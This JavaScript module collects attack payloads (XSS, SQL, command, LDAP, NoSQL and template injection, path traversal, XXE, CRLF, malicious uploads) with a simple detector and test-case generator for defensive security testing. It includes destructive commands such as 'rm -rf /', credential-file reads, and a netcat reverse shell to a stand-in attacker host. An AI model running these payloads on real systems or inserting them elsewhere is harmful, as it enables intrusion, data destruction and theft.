/**
 * Security Patterns Configuration
 * 
 * Centralized configuration for security testing patterns and attack vectors.
 * This module focuses on security validation and threat detection patterns.
 */

// Import deep freeze utility
import { deepFreeze } from './immutable-utils.js';

// Cross-Site Scripting (XSS) attack patterns for testing
export const XSS_PATTERNS = deepFreeze({
  BASIC_SCRIPT_TAGS: [
    '<script>alert("xss")</script>',
    '<script>alert(1)</script>',
    '<script>console.log("xss")</script>',
    '<script src="malicious.js"></script>',
    '<script type="text/javascript">alert("xss")</script>'
  ],

  JAVASCRIPT_URLS: [
    'javascript:alert("xss")',
    'javascript:void(0)',
    'javascript:eval("alert(1)")',
    'javascript:document.write("xss")',
    'JAVASCRIPT:alert("xss")' // Case variation
  ],

  DATA_URLS: [
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'data:application/javascript,alert(1)',
    'data:text/javascript,alert("xss")'
  ],

  EVENT_HANDLERS: [
    'onload="alert(1)"',
    'onerror="alert(1)"',
    'onclick="alert(1)"',
    'onmouseover="alert(1)"',
    'onfocus="alert(1)"',
    'onblur="alert(1)"',
    'onchange="alert(1)"',
    'onsubmit="alert(1)"'
  ],

  HTML_INJECTION: [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
  ],

  ENCODED_PAYLOADS: [
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e'
  ],

  FILTER_BYPASS: [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img src="x" onerror="alert(String.fromCharCode(88,83,83))">',
    '<svg><script>alert&#40;1&#41;</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>"
  ]
});

// SQL Injection attack patterns for testing
export const SQL_INJECTION_PATTERNS = deepFreeze({
  BASIC_INJECTION: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin'--",
    "admin'/*",
    "' OR 'x'='x",
    "') OR ('1'='1"
  ],

  UNION_ATTACKS: [
    "' UNION SELECT * FROM users --",
    "' UNION SELECT username, password FROM users --",
    "' UNION ALL SELECT NULL, username, password FROM users --",
    "1' UNION SELECT 1,2,3,4,5 --"
  ],

  BLIND_INJECTION: [
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' AND SUBSTRING(@@version,1,1) = '5' --",
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64 --",
    "' WAITFOR DELAY '00:00:05' --"
  ],

  TIME_BASED: [
    "'; WAITFOR DELAY '00:00:05' --",
    "' OR SLEEP(5) --",
    "'; SELECT pg_sleep(5) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
  ],

  ERROR_BASED: [
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) --"
  ],

  SECOND_ORDER: [
    "admin'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "test'; UPDATE users SET password='hacked' WHERE username='admin'; --"
  ]
});

// Command Injection patterns for testing
export const COMMAND_INJECTION_PATTERNS = deepFreeze({
  BASIC_COMMANDS: [
    '; ls -la',
    '&& cat /etc/passwd',
    '| whoami',
    '; rm -rf /',
    '`id`',
    '$(whoami)',
    '; nc -e /bin/sh attacker.com 4444'
  ],

  WINDOWS_COMMANDS: [
    '& dir',
    '&& type C:\\Windows\\System32\\drivers\\etc\\hosts',
    '| whoami',
    '; del /f /q C:\\*.*',
    '`whoami`',
    '$(Get-Process)'
  ],

  ENCODED_COMMANDS: [
    '%3B%20ls%20-la',
    '%26%26%20cat%20%2Fetc%2Fpasswd',
    '%7C%20whoami',
    '\\x3b\\x20ls\\x20-la'
  ]
});

// Path Traversal patterns for testing
export const PATH_TRAVERSAL_PATTERNS = deepFreeze({
  BASIC_TRAVERSAL: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd'
  ],

  NULL_BYTE: [
    '../../../etc/passwd%00',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00.txt',
    '../../../etc/passwd\x00.jpg'
  ],

  UNICODE_ENCODING: [
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd'
  ]
});

// LDAP Injection patterns for testing
export const LDAP_INJECTION_PATTERNS = deepFreeze({
  BASIC_INJECTION: [
    '*)(uid=*',
    '*)(|(uid=*))',
    '*)(&(uid=*)',
    '*))%00',
    '*()|%26'
  ],

  BLIND_INJECTION: [
    '*)(uid=admin)(|(uid=*',
    '*)(|(password=*))',
    '*)(|(cn=*))'
  ]
});

// XML Injection patterns for testing
export const XML_INJECTION_PATTERNS = deepFreeze({
  XXE_ATTACKS: [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
    '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>'
  ],

  BILLION_LAUGHS: [
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>'
  ]
});

// NoSQL Injection patterns for testing
export const NOSQL_INJECTION_PATTERNS = deepFreeze({
  MONGODB: [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "this.username == this.password"}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}'
  ],

  COUCHDB: [
    '{"selector": {"_id": {"$gt": null}}}',
    '{"selector": {"$or": [{"username": "admin"}, {"role": "admin"}]}}'
  ]
});

// Server-Side Template Injection patterns
export const SSTI_PATTERNS = deepFreeze({
  JINJA2: [
    '{{7*7}}',
    '{{config.items()}}',
    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    '{{"".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}'
  ],

  TWIG: [
    '{{7*7}}',
    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
    '{{["id"]|filter("system")}}'
  ],

  FREEMARKER: [
    '${7*7}',
    '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
    '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream().readAllBytes()?join(" ")}'
  ]
});

// Header Injection patterns for testing
export const HEADER_INJECTION_PATTERNS = deepFreeze({
  HTTP_RESPONSE_SPLITTING: [
    'test\r\nSet-Cookie: admin=true',
    'test\r\n\r\n<script>alert(1)</script>',
    'test%0d%0aSet-Cookie:%20admin=true',
    'test%0d%0a%0d%0a<html><body>Injected</body></html>'
  ],

  CRLF_INJECTION: [
    'test\r\nLocation: http://evil.com',
    'test\n\rContent-Length: 0\n\r\n\rHTTP/1.1 200 OK\n\rContent-Type: text/html\n\r\n\r<html>Injected</html>',
    'test%0aLocation:%20http://evil.com'
  ]
});

// File Upload attack patterns
export const FILE_UPLOAD_PATTERNS = deepFreeze({
  MALICIOUS_EXTENSIONS: [
    'shell.php',
    'backdoor.jsp',
    'webshell.asp',
    'trojan.exe',
    'virus.scr',
    'malware.bat',
    'script.js',
    'payload.jar'
  ],

  DOUBLE_EXTENSIONS: [
    'image.jpg.php',
    'document.pdf.jsp',
    'photo.png.asp',
    'file.txt.exe'
  ],

  NULL_BYTE: [
    'shell.php%00.jpg',
    'backdoor.jsp\x00.png',
    'webshell.asp%00.gif'
  ],

  MIME_TYPE_BYPASS: [
    { filename: 'shell.php', mimeType: 'image/jpeg' },
    { filename: 'backdoor.jsp', mimeType: 'text/plain' },
    { filename: 'webshell.asp', mimeType: 'application/pdf' }
  ]
});

// Authentication bypass patterns
export const AUTH_BYPASS_PATTERNS = deepFreeze({
  JWT_ATTACKS: [
    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.',
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6OTk5OTk5OTk5OX0.invalid_signature'
  ],

  SESSION_FIXATION: [
    'PHPSESSID=attacker_controlled_session',
    'JSESSIONID=malicious_session_id'
  ],

  PARAMETER_POLLUTION: [
    'user=guest&user=admin',
    'role=user&role=admin',
    'access=read&access=write'
  ]
});

// Business Logic attack patterns
export const BUSINESS_LOGIC_PATTERNS = deepFreeze({
  RACE_CONDITIONS: [
    { action: 'withdraw', amount: 1000, concurrent: true },
    { action: 'purchase', item: 'premium', price: 0 },
    { action: 'vote', candidate: 'A', multiple: true }
  ],

  PRICE_MANIPULATION: [
    { item: 'product', price: -100 },
    { item: 'service', price: 0.01 },
    { item: 'premium', discount: 200 }
  ],

  WORKFLOW_BYPASS: [
    { step: 'payment', status: 'completed', bypass: true },
    { step: 'approval', status: 'approved', unauthorized: true },
    { step: 'verification', status: 'verified', skip: true }
  ]
});

/**
 * Detects potential security threats in input data
 * @param {string} input - Input string to analyze
 * @param {Array} patterns - Array of patterns to check against
 * @returns {Object} Detection result with threat information
 */
export function detectSecurityThreats(input, _patterns = []) {
  const threats = [];
  
  if (typeof input !== 'string') {
    return { threats: [], safe: true };
  }

  // Check XSS patterns
  for (const category of Object.values(XSS_PATTERNS)) {
    for (const pattern of category) {
      if (input.toLowerCase().includes(pattern.toLowerCase())) {
        threats.push({
          type: 'XSS',
          pattern,
          severity: 'HIGH',
          description: 'Potential Cross-Site Scripting attack detected'
        });
      }
    }
  }

  // Check SQL injection patterns
  for (const category of Object.values(SQL_INJECTION_PATTERNS)) {
    for (const pattern of category) {
      if (input.toLowerCase().includes(pattern.toLowerCase())) {
        threats.push({
          type: 'SQL_INJECTION',
          pattern,
          severity: 'CRITICAL',
          description: 'Potential SQL Injection attack detected'
        });
      }
    }
  }

  // Check command injection patterns
  for (const category of Object.values(COMMAND_INJECTION_PATTERNS)) {
    for (const pattern of category) {
      if (input.includes(pattern)) {
        threats.push({
          type: 'COMMAND_INJECTION',
          pattern,
          severity: 'CRITICAL',
          description: 'Potential Command Injection attack detected'
        });
      }
    }
  }

  // Check path traversal patterns
  for (const category of Object.values(PATH_TRAVERSAL_PATTERNS)) {
    for (const pattern of category) {
      if (input.includes(pattern)) {
        threats.push({
          type: 'PATH_TRAVERSAL',
          pattern,
          severity: 'HIGH',
          description: 'Potential Path Traversal attack detected'
        });
      }
    }
  }

  return {
    threats,
    safe: threats.length === 0,
    riskLevel: threats.length > 0 ? Math.max(...threats.map(t => 
      t.severity === 'CRITICAL' ? 4 : 
      t.severity === 'HIGH' ? 3 : 
      t.severity === 'MEDIUM' ? 2 : 1
    )) : 0
  };
}

/**
 * Generates security test cases for property-based testing
 * @param {string} category - Category of attack patterns to generate
 * @param {number} count - Number of test cases to generate
 * @returns {Array} Array of security test cases
 */
export function generateSecurityTestCases(category = 'ALL', count = 10) {
  const testCases = [];
  let patterns = [];

  switch (category.toUpperCase()) {
    case 'XSS':
      patterns = Object.values(XSS_PATTERNS).flat();
      break;
    case 'SQL':
      patterns = Object.values(SQL_INJECTION_PATTERNS).flat();
      break;
    case 'COMMAND':
      patterns = Object.values(COMMAND_INJECTION_PATTERNS).flat();
      break;
    case 'PATH':
      patterns = Object.values(PATH_TRAVERSAL_PATTERNS).flat();
      break;
    case 'ALL':
    default:
      patterns = [
        ...Object.values(XSS_PATTERNS).flat(),
        ...Object.values(SQL_INJECTION_PATTERNS).flat(),
        ...Object.values(COMMAND_INJECTION_PATTERNS).flat(),
        ...Object.values(PATH_TRAVERSAL_PATTERNS).flat()
      ];
      break;
  }

  for (let i = 0; i < Math.min(count, patterns.length); i++) {
    const pattern = patterns[i % patterns.length];
    testCases.push({
      input: pattern,
      expected: 'BLOCKED',
      category,
      severity: 'HIGH',
      description: `Security test case ${i + 1} for ${category}`
    });
  }

  return testCases;
}

/**
 * Validates security configuration settings
 * @param {Object} config - Security configuration to validate
 * @returns {Object} Validation result
 */
export function validateSecurityConfig(config) {
  const errors = [];
  const warnings = [];

  // Check required security settings
  const requiredSettings = [
    'csrfProtection',
    'xssProtection',
    'sqlInjectionProtection',
    'rateLimiting',
    'inputValidation'
  ];

  for (const setting of requiredSettings) {
    if (!(setting in config) || !config[setting]) {
      errors.push(`Missing or disabled security setting: ${setting}`);
    }
  }

  // Check security header configuration
  if (config.securityHeaders) {
    const requiredHeaders = [
      'X-Content-Type-Options',
      'X-Frame-Options',
      'X-XSS-Protection',
      'Strict-Transport-Security'
    ];

    for (const header of requiredHeaders) {
      if (!config.securityHeaders[header]) {
        warnings.push(`Missing security header: ${header}`);
      }
    }
  }

  return {
    valid: errors.length === 0,
    errors,
    warnings,
    score: Math.max(0, 100 - (errors.length * 20) - (warnings.length * 5))
  };
}

// Export frozen objects to prevent mutation
export const SECURITY_PATTERNS = deepFreeze({
  XSS_PATTERNS,
  SQL_INJECTION_PATTERNS,
  COMMAND_INJECTION_PATTERNS,
  PATH_TRAVERSAL_PATTERNS,
  LDAP_INJECTION_PATTERNS,
  XML_INJECTION_PATTERNS,
  NOSQL_INJECTION_PATTERNS,
  SSTI_PATTERNS,
  HEADER_INJECTION_PATTERNS,
  FILE_UPLOAD_PATTERNS,
  AUTH_BYPASS_PATTERNS,
  BUSINESS_LOGIC_PATTERNS
});

// Default export
export default {
  SECURITY_PATTERNS,
  detectSecurityThreats,
  generateSecurityTestCases,
  validateSecurityConfig
};

if (typeof describe !== 'undefined') {
  describe('Security Patterns', () => {
    test('exports security helpers', () => {
      expect(SECURITY_PATTERNS).toBeDefined();
      expect(detectSecurityThreats).toBeDefined();
    });
  });
}
